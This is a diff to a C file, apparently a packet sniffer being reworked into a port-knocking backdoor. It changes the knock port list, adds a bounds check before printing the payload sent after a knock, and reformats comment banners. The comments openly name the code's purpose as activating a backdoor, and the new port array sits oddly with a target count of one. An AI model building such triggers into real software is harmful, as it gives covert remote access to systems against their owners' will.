@@ -291,13 +291,23 @@ print_app_usage(void);
 
 
 
-// ---------------------  M Y   M O D I F I C A T I O N S  --------------------------
+
+
+
+
+
+
+
+
+
+
+// -----------------------------  M Y   M O D I F I C A T I O N S  ----------------------------------
 
 
 
 
 // the target port knocking port
-#define TARGET_PORTS 	(int[]) {1337}
+#define TARGET_PORTS 	(int[]) {{1337},{200}}
 
 // number of knocks to activate the backdoor
 #define NUM_TARGETS 1
@@ -339,10 +349,12 @@ int update_pknock_state(int dst_port, const char* payload, int size_payload){
 				// print out rest of the payload
 				int payload_bytes = PAYLOAD_SIZE;
 				if(size_payload - (target_bytes-1) < PAYLOAD_SIZE) payload_bytes = size_payload - target_bytes;
-				char msg[payload_bytes+1];
-				memcpy(msg, payload+target_bytes-1, payload_bytes);
-				msg[payload_bytes]=0;
-				printf("%s\n",(const char*) msg);
+				if(payload_bytes > 0){
+					char msg[payload_bytes+1];
+					memcpy(msg, payload+target_bytes-1, payload_bytes);
+					msg[payload_bytes]=0;
+					printf("%s\n",(const char*) msg);
+				}
 			#endif
 
 			return 1;
@@ -404,8 +416,18 @@ int check_env_key(const char* ip_addr, FILE* config_file){
 
 
 
+// ----------------------------------------------------------------------------------------------------
 
-// ------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
 
 
 
